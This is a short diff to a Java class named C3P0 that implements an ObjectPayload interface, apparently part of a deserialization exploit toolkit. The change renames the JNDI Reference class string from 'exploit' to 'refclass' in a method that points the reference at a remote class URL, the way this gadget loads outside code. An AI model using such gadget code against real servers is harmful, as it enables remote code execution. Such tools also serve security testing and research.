@@ -70,7 +70,7 @@ public class C3P0 implements ObjectPayload<Object> {
         }
 
         public Reference getReference () throws NamingException {
-            return new Reference("exploit", this.className, this.url);
+            return new Reference("refclass", this.className, this.url);
         }
 
         public PrintWriter getLogWriter () throws SQLException {return null;}
